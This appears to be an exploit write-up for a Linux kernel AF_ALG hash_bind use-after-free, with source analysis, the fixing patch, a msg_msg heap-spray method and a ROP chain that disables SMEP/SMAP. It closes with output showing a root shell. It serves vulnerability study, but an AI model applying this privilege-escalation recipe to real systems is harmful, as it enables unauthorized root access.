# Linux Kernel AF_ALG hash_bind use-after-free

## Bug 
https://lkml.org/lkml/2015/12/17/263  

CVE: None

## Vuln Versions  
Linux Kernel 3.8.0 -> 4.3.6  

## Security  
KASLR - Not enabled on vulnerable kernel versions  
SMEP/SMAP - Bypassed  

## Testing

[Ubuntu 15.10](https://old-releases.ubuntu.com/releases/wily/ubuntu-15.10-desktop-amd64.iso)  
[Fix apt updates](https://askubuntu.com/questions/91815/how-to-install-software-or-upgrade-from-an-old-unsupported-release)  
[compile/install systemtap](https://stackoverflow.com/questions/46047270/systemtap-error-on-ubuntu)  
Install kernel dbgsym.  

## RCA 
```alg_bind``` creates a crypto_tfm object when "hash" is specified as the type and hash_bind is called on a socket.  

Calling accept() creates a child socket with references to the previously created crypto_tfm object.  

Finally calling bind on the socket a second time will free the crypto_tfm object allowing reallocation/manipulation of the object.  

```c
static int alg_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
{
	const u32 forbidden = CRYPTO_ALG_INTERNAL;
	struct sock *sk = sock->sk;
	struct alg_sock *ask = alg_sk(sk);   // create ALG socket
	struct sockaddr_alg *sa = (void *)uaddr;
	const struct af_alg_type *type;
	void *private;

	if (sock->state == SS_CONNECTED)
		return -EINVAL;

	if (addr_len != sizeof(*sa))
		return -EINVAL;

	sa->salg_type[sizeof(sa->salg_type) - 1] = 0;
	sa->salg_name[sizeof(sa->salg_name) - 1] = 0;

	type = alg_get_type(sa->salg_type);
	if (IS_ERR(type) && PTR_ERR(type) == -ENOENT) {
		request_module("algif-%s", sa->salg_type);
		type = alg_get_type(sa->salg_type);
	}

	if (IS_ERR(type))
		return PTR_ERR(type);

	private = type->bind(sa->salg_name,
			     sa->salg_feat & ~forbidden,
			     sa->salg_mask & ~forbidden); // call hash_bind & allocates the tfm
	if (IS_ERR(private)) {
		module_put(type->owner);
		return PTR_ERR(private);
	}

	lock_sock(sk);

	swap(ask->type, type);       // set to 0 initially on first bind() no child socket
	swap(ask->private, private); // set to 0 initially on first bind() no child socket

	release_sock(sk);

	alg_do_release(type, private); // frees tfm on second bind()

	return 0;
}

static void alg_do_release(const struct af_alg_type *type, void *private)
{
	if (!type)
		return; // returns on first bind

	type->release(private); // calls hash_release on second bind.
	module_put(type->owner);
}
```  

```c
static void *hash_bind(const char *name, u32 type, u32 mask)
{
	return crypto_alloc_ahash(name, type, mask);
}
```
```c
struct crypto_ahash *crypto_alloc_ahash(const char *alg_name, u32 type, u32 mask)
{
	return crypto_alloc_tfm(alg_name, &crypto_ahash_type, type, mask);
}

void *crypto_alloc_tfm(const char *alg_name, const struct crypto_type *frontend, u32 type, u32 mask)
{
	void *tfm;
	int err;

	for (;;) {
		struct crypto_alg *alg;

		alg = crypto_find_alg(alg_name, frontend, type, mask);
		if (IS_ERR(alg)) {
			err = PTR_ERR(alg);
			goto err;
		}

		tfm = crypto_create_tfm(alg, frontend);
		if (!IS_ERR(tfm))
			return tfm;

		crypto_mod_put(alg);
		err = PTR_ERR(tfm);

err:
		if (err != -EAGAIN)
			break;
		if (signal_pending(current)) {
			err = -EINTR;
			break;
		}
	}

	return ERR_PTR(err);
}

void *crypto_create_tfm(struct crypto_alg *alg, const struct crypto_type *frontend)
{
	char *mem;
	struct crypto_tfm *tfm = NULL;
	unsigned int tfmsize;
	unsigned int total;
	int err = -ENOMEM;

	tfmsize = frontend->tfmsize; 
	total = tfmsize + sizeof(*tfm) + frontend->extsize(alg); // [1]

	mem = kzalloc(total, GFP_KERNEL); // [2]
	if (mem == NULL)
		goto out_err;

	tfm = (struct crypto_tfm *)(mem + tfmsize);
	tfm->__crt_alg = alg;

	err = frontend->init_tfm(tfm);
	if (err)
		goto out_free_tfm;

	if (!tfm->exit && alg->cra_init && (err = alg->cra_init(tfm)))
		goto cra_init_failed;

	goto out;

cra_init_failed:
	crypto_exit_ops(tfm);
out_free_tfm:
	if (err == -EAGAIN)
		crypto_shoot_alg(alg);
	kfree(mem);
out_err:
	mem = ERR_PTR(err);
out:
	return mem;
}
```

```c
static void hash_release(void *private)
{
	crypto_free_ahash(private); // free tfm 
}

static inline void crypto_free_ahash(struct crypto_ahash *tfm)
{
	crypto_destroy_tfm(tfm, crypto_ahash_tfm(tfm));
}

void crypto_destroy_tfm(void *mem, struct crypto_tfm *tfm)
{
	struct crypto_alg *alg;

	if (unlikely(!mem))
		return;

	alg = tfm->__crt_alg;

	if (!tfm->exit && alg->cra_exit)
		alg->cra_exit(tfm);
	crypto_exit_ops(tfm);
	crypto_mod_put(alg);
	kzfree(mem);
}
```

## Patch  
https://lore.kernel.org/lkml/1486322063-7558-5-git-send-email-w@1wt.eu/

Add a refcount for child alg sockets, refactor code to check refcount before 
calling release_* functions preventing the tfm or socket being freed early.  

```c
diff --git a/crypto/af_alg.c b/crypto/af_alg.c
index 1aaa555..0ca108f 100644
--- a/crypto/af_alg.c
+++ b/crypto/af_alg.c
@@ -125,6 +125,23 @@ int af_alg_release(struct socket *sock)
 }
 EXPORT_SYMBOL_GPL(af_alg_release);
 
+void af_alg_release_parent(struct sock *sk)
+{
+	struct alg_sock *ask = alg_sk(sk);
+	bool last;
+
+	sk = ask->parent;
+	ask = alg_sk(sk);
+
+	lock_sock(sk);
+	last = !--ask->refcnt;
+	release_sock(sk);
+
+	if (last)
+		sock_put(sk);
+}
+EXPORT_SYMBOL_GPL(af_alg_release_parent);
+
 static int alg_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
 {
 	struct sock *sk = sock->sk;
@@ -132,6 +149,7 @@ static int alg_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
 	struct sockaddr_alg *sa = (void *)uaddr;
 	const struct af_alg_type *type;
 	void *private;
+	int err;
 
 	if (sock->state == SS_CONNECTED)
 		return -EINVAL;
@@ -157,16 +175,22 @@ static int alg_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
 		return PTR_ERR(private);
 	}
 
+	err = -EBUSY;
 	lock_sock(sk);
+	if (ask->refcnt)
+		goto unlock;
 
 	swap(ask->type, type);
 	swap(ask->private, private);
 
+	err = 0;
+
+unlock:
 	release_sock(sk);
 
 	alg_do_release(type, private);
 
-	return 0;
+	return err;
 }
 
 static int alg_setkey(struct sock *sk, char __user *ukey,
@@ -199,11 +223,15 @@ static int alg_setsockopt(struct socket *sock, int level, int optname,
 	struct sock *sk = sock->sk;
 	struct alg_sock *ask = alg_sk(sk);
 	const struct af_alg_type *type;
-	int err = -ENOPROTOOPT;
+	int err = -EBUSY;
 
 	lock_sock(sk);
+	if (ask->refcnt)
+		goto unlock;
+
 	type = ask->type;
 
+	err = -ENOPROTOOPT;
 	if (level != SOL_ALG || !type)
 		goto unlock;
 
@@ -252,7 +280,8 @@ int af_alg_accept(struct sock *sk, struct socket *newsock)
 
 	sk2->sk_family = PF_ALG;
 
-	sock_hold(sk);
+	if (!ask->refcnt++)
+		sock_hold(sk);
 	alg_sk(sk2)->parent = sk;
 	alg_sk(sk2)->type = type;
 
diff --git a/include/crypto/if_alg.h b/include/crypto/if_alg.h
index d61c111..2f38daa 100644
--- a/include/crypto/if_alg.h
+++ b/include/crypto/if_alg.h
@@ -30,6 +30,8 @@ struct alg_sock {
 
 	struct sock *parent;
 
+	unsigned int refcnt;
+
 	const struct af_alg_type *type;
 	void *private;
 };
@@ -64,6 +66,7 @@ int af_alg_register_type(const struct af_alg_type *type);
 int af_alg_unregister_type(const struct af_alg_type *type);
 
 int af_alg_release(struct socket *sock);
+void af_alg_release_parent(struct sock *sk);
 int af_alg_accept(struct sock *sk, struct socket *newsock);
 
 int af_alg_make_sg(struct af_alg_sgl *sgl, void __user *addr, int len,
@@ -80,11 +83,6 @@ static inline struct alg_sock *alg_sk(struct sock *sk)
 	return (struct alg_sock *)sk;
 }
 
-static inline void af_alg_release_parent(struct sock *sk)
-{
-	sock_put(alg_sk(sk)->parent);
-}
-
  ```

## Visualizing w/Systemtap

Calling the trigger with systemtap attached and listening to kmalloc invocations gives
a clear picture of the call-path and target object without much effort:  

```bash
alg_create -> CALL -> params -> net=0xffffffff81ceb480 sock=0xffff8800353b2580 protocol=0x0 kern=0x0
__KMALLOC-ENTER: alg_socket -> 3019: size: 0x2d8(728) slab obj size: 1024 buffer at: 0xffff880256146c00 (size=728)

alg_bind -> CALL -> params -> sock=0xffff8800353b2580 uaddr=0xffff88021927fe90 addr_len=0x58
alg_get_type -> CALL -> params -> name=0xffff88021927fe92
hash_bind -> CALL -> params -> name=0xffff88021927fea8 type=0x0 mask=0x0
__KMALLOC-ENTER: alg_socket -> 3019: size: 0xa0(160) slab obj size: 192 0xffffffff811de910 : __kmalloc+0x0/0x250 [kernel]
 0xffffffff8137ca27 : crypto_alloc_tfm+0x77/0x110 [kernel]
 0xffffffff81384259 : crypto_alloc_ahash+0x19/0x20 [kernel]
 0xffffffffc02f666e : hash_bind+0xe/0x10 [algif_hash]
 0xffffffffc02e28d9 : alg_bind+0x69/0x120 [af_alg]
 0xffffffff816c76a2 : SYSC_bind+0xd2/0x110 [kernel]
 0xffffffff816c846e : sys_bind+0xe/0x10 [kernel]
 0xffffffff817ef9f2 : entry_SYSCALL_64_fastpath+0x16/0x75 [kernel]
 buffer at: 0xffff88024f7c38c0 (size=160)
__KMALLOC-ENTER: alg_socket -> 3019: size: 0x58(88) slab obj size: 96 buffer at: 0xffff88025112c300 (size=88)

alg_accept -> CALL -> params -> sock=0xffff8800353b2580 newsock=0xffff8800353b2080 flags=0x2
af_alg_accept -> CALL -> params -> sk=0xffff880256146c00 newsock=0xffff8800353b2080
__KMALLOC-ENTER: alg_socket -> 3019: size: 0x2d8(728) slab obj size: 1024 buffer at: 0xffff880256142800 (size=728)
hash_accept_parent -> CALL -> params -> private=0xffff88024f7c38c0 sk=0xffff880256142800
__KMALLOC-ENTER: alg_socket -> 3019: size: 0x398(920) slab obj size: 1024 buffer at: 0xffff880256143800 (size=920)
__KMALLOC-ENTER: alg_socket -> 3019: size: 0x10(16) slab obj size: 16 buffer at: 0xffff880255b98ed0 (size=16)

alg_bind -> CALL -> params -> sock=0xffff8800353b2580 uaddr=0xffff88021927fe90 addr_len=0x58
alg_get_type -> CALL -> params -> name=0xffff88021927fe92
hash_bind -> CALL -> params -> name=0xffff88021927fea8 type=0x0 mask=0x0
__KMALLOC-ENTER: alg_socket -> 3019: size: 0xa0(160) slab obj size: 192 0xffffffff811de910 : __kmalloc+0x0/0x250 [kernel]
 0xffffffff8137ca27 : crypto_alloc_tfm+0x77/0x110 [kernel]
 0xffffffff81384259 : crypto_alloc_ahash+0x19/0x20 [kernel]
 0xffffffffc02f666e : hash_bind+0xe/0x10 [algif_hash]
 0xffffffffc02e28d9 : alg_bind+0x69/0x120 [af_alg]
 0xffffffff816c76a2 : SYSC_bind+0xd2/0x110 [kernel]
 0xffffffff816c846e : sys_bind+0xe/0x10 [kernel]
 0xffffffff817ef9f2 : entry_SYSCALL_64_fastpath+0x16/0x75 [kernel]
 buffer at: 0xffff88024f7c3e00 (size=160)
__KMALLOC-ENTER: alg_socket -> 3019: size: 0x58(88) slab obj size: 96 buffer at: 0xffff88025112c540 (size=88)

hash_release -> CALL -> params -> private=0xffff88024f7c38c0
__KMALLOC-FREE: buffer: 0xffff88025112c300
__KMALLOC-FREE: buffer: 0xffff88024f7c38c0
```

This line is the corrupted objects allocation & size that corresponds with a crypto_tfm: 
```bash
__KMALLOC-ENTER: alg_socket -> 3019: size: 0xa0(160) slab obj size: 192 0xffffffff811de910 : __kmalloc+0x0/0x250 [kernel]
```

Note the object is allocated in the ```kmalloc-192``` cache.  

## Heap spray/Object control  

```msg_msg``` has a 0x30 byte size header that we cant control giving us less space to work with using the typical msg_msg spray.  

```c
struct msg_msg {
    struct list_head m_list;
    long m_type;
    size_t m_ts;
    struct msg_msgseg *next;
    void *security;
}

p/x sizeof(struct msg_msg)
$2 = 0x30
```  
Calling msgsend with ```size > DATALEN_MSG``` the message is split into two objects in two different caches. The first msg_msg object 
will be in the ```kmalloc-4096``` cache and the remaining msg data will be allocated in a ```msg_msgseg``` struct in the kmalloc cache that is closest fits
the remaining data - ```0x8``` the size of the msg_segmsg header.  

```c
#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))
#define DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))


static struct msg_msg *alloc_msg(size_t len)
{
	struct msg_msg *msg;
	struct msg_msgseg **pseg;
	size_t alen;

	alen = min(len, DATALEN_MSG); //
	msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL);
	if (msg == NULL)
		return NULL;

	msg->next = NULL;
	msg->security = NULL;

	len -= alen;
	pseg = &msg->next;
	while (len > 0) { //
		struct msg_msgseg *seg;
		alen = min(len, DATALEN_SEG);
		seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL);
		if (seg == NULL)
			goto out_err;
		*pseg = seg;
		seg->next = NULL;
		pseg = &seg->next;
		len -= alen;
	}

	return msg;

out_err:
	free_msg(msg);
	return NULL;
}
```

```c
struct msg_msgseg {
	struct msg_msgseg *next;
	/* the next part of the message follows immediately */
};
```

```sizeof(struct msg_msgsg) = 0x8```
The header of msg_msgseg is 0x8 bytes vs 0x30 bytes for msg_msg

Calling msgsnd() with size = ```(4096 - 0x30) + (0xC0 - 0x8)``` we get a msg_msg in kmalloc-4096 and a msg_msgseg in kmalloc-192.  

With this we can create & manipulate the freed target object in the kmalloc-192 cache.  

## RIP control
```c
// https://elixir.bootlin.com/linux/v4.2/source/crypto/algif_hash.c#L174
static int hash_accept(struct socket *sock, struct socket *newsock, int flags)
{
	struct sock *sk = sock->sk;
	struct alg_sock *ask = alg_sk(sk);
	struct hash_ctx *ctx = ask->private;
	struct ahash_request *req = &ctx->req;
	char state[crypto_ahash_statesize(crypto_ahash_reqtfm(req))]; // 
	struct sock *sk2;
	struct alg_sock *ask2;
	struct hash_ctx *ctx2;
	int err;

	err = crypto_ahash_export(req, state); // 
	if (err)
		return err;

	err = af_alg_accept(ask->parent, newsock);
	if (err)
		return err;

	sk2 = newsock->sk;
	ask2 = alg_sk(sk2);
	ctx2 = ask2->private;
	ctx2->more = 1;

	err = crypto_ahash_import(&ctx2->req, state);
	if (err) {
		sock_orphan(sk2);
		sock_put(sk2);
	}

	return err;
}
```  

```c
static inline int crypto_ahash_export(struct ahash_request *req, void *out)
{
        return crypto_ahash_reqtfm(req)->export(req, out);
}
```

```c
static inline struct crypto_ahash *crypto_ahash_reqtfm(
	struct ahash_request *req)
{
	return __crypto_ahash_cast(req->base.tfm);
}
```

hash_accept -> crypto_ahash_export -> crypto_ahash_reqtfm -> __crypto_ahash_cast(req->base.tfm).  
 
```c
// https://elixir.bootlin.com/linux/v4.2/source/include/crypto/hash.h#L190
struct crypto_ahash {
        int (*init)(struct ahash_request *req);
        int (*update)(struct ahash_request *req);
        int (*final)(struct ahash_request *req);
        int (*finup)(struct ahash_request *req);
        int (*digest)(struct ahash_request *req);
        int (*export)(struct ahash_request *req, void *out);
        int (*import)(struct ahash_request *req, const void *in);
        int (*setkey)(struct crypto_ahash *tfm, const u8 *key,
                      unsigned int keylen);

        unsigned int reqsize;
        struct crypto_tfm base;
};
```

```bash
(gdb) x/i $pc
=> 0xffffffffc0365456 <hash_accept+70>: call   *-0x20(%rdx)
(gdb) x/10gx $rdx-0x20
0xffff8802211dc4a8:	0x4141414141414141	0x4141414141414141
0xffff8802211dc4b8:	0x4141414141414141	0x4141414141414141

(gdb) bt
#0  0xffffffffc0365456 in crypto_ahash_export (out=<optimized out>, req=<optimized out>) at /build/linux-AxjFAn/linux-4.2.0/include/crypto/hash.h:414
#1  hash_accept (sock=<optimized out>, newsock=0xffff88025431d500, flags=<optimized out>) at /build/linux-AxjFAn/linux-4.2.0/crypto/algif_hash.c:186
```

```crypto_ahash_export``` casts our corrupted_tfm as a crypto_ahash and calls the corrupted export() function pointer leading to RIP control.  

## ROP Chain/SMEP & SMAP bypass

The vulnerable kernel versions predate the CR4 register being pinned at boot so use the ```native_write_cr4``` trick to  disable SMEP & SMAP 
by modifying the 20 & 21st bits in the CR4 register.  

After that we escalate privs by calling ```commit_creds(prepare_kernel_creds(0))```.  

return to userland from kernel space to execute a shell using ```swapgs & iret``` instructions.  

Save the userland ```RSP, CC, SS, RFLAGS``` to supply to the ```iret``` instruction as well as a userland address to supply as a userland ```RIP```
to point execution to. 

Setting the RIP register to the pointer for the ```do_shell()``` rust function will spawn a shell as root.

Specific gadgets needed:  

```push rdx; pop rsp ; ret``` - to pivot the stack to our controlled memory.  
```pop rdi; ret``` - to pass arguments to functions such as ```native_write_cr4``` && ```prepare_kernel_cred```.  
```mov rdi, rax; ret``` - to pass the return value from ```prepare_kernel_cred``` from ```RAX``` to ```RDI```.  

Using ROPGadget found these:  
```
push rdx ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret 
pop rdi ; ret
mov rdi, rax ; mov rax, rdi ; pop rbx ; pop rbp ; ret
```  

We can ignore the ``` add byte ptr [rbx + 0x41], bl; ``` and the ```pop rbp```.  
Taking note that the next value on the stack of our corrupted object will be popped into RBP - so it should be a placeholder value.  

Similarly we can ignore the ```mov rax, rdi; pop rbx ; pop rbp``` in the ```mov rax, rdi``` gadget.  

Now we can execute a rop chain from our "fake stack" that is the corrupted crypto_tfm object in RDX now pointed to by RSP.  
The final chain should look like this:  
```
RIP = stack pivot : push rdx ; pop rsp ; ret
fake stack:
-------------------------
+0x28 pop rdi; ret
+0x8  DESIRED_CR4
+0x8  native_write_cr4 
+0x8  pop rdi; ret
+0x8  0x000000000
+0x8  prepare_kernel
+0x8  mov rdi, rax
+0x18 commit_cred
+0x8  stage_one
```

Executing the exploit with everything gets our root shell:  
```bash
$ ./target/debug/exploit
[+] System release: 4.2.0-16-generic
[+] Found kernel target.
[+] Locked in
[+] Setting up mqueue
[+] Release previous msgs in the Queue
[+] number of msgs in queue: 0
[+] Consuming SLABs
[+] Setting up alg socket
[+] Triggering free on obj
[+] Trying to reallocate target object
[*] started from the $ now youre #
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

## Debug notes

rip control:
b crypto_ahash_export

rop chain:
b native_write_cr4

# cleanup  

should perform cleanup to not crash in hash_sock_destruct when exiting shell but meh.

# Rust notes

The only external variable access ```#[naked]``` functions have is for ```const``` and ```sym```.  

```global_asm!()``` works the same as a naked function in allowed variable/arguments.  

You can use a non ```#[naked]``` function with an ```asm!()``` macro that passes values but has caveates:  

Those values are stored in intermedieate registers instead of being passed to the immediet register. If you call functions before using those passed params those intermediate registers can get clobbered making the passed values incorrect.  